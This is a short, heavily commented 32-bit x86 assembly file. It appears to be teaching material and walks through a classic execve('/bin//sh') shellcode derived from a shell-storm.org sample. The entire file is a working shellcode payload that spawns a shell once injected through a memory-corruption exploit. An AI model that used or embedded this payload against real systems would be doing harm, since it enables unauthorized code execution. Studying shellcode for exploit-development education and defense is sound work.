; Inspired by: http://repo.shell-storm.org/shellcode/files/shellcode-827.php

; Do execve("/bin//sh", ["/bin//sh", NULL], NULL) as a syscall.
; Arguments are passed in registers:
;    ebx <- "/bin//sh"
;    ecx <- ["/bin//sh", NULL]
;    edx <- NULL
; Syscall number (0xb) is passed in al register.

BITS 32

xor eax, eax        ; eax <- 0
push eax            ; NUL-terminate the "/bin//sh" string.
push 0x68732f2f     ; Push "//sh" string on the stack.
push 0x6e69622f     ; Push "/bin" string on the stack.
mov ebx, esp        ; ebx <- pointer to "/bin//sh" (NUL-terminated).
push eax            ; Place NULL on the stack.
push ebx            ; Place pointer to "/bin//sh".
mov ecx, esp        ; ecx <- ["/bin//sh", NULL]
xor edx, edx        ; edx <- NULL
mov al, 0xb         ; Store execve syscall number (11) in al.
int 0x80            ; Do syscall.
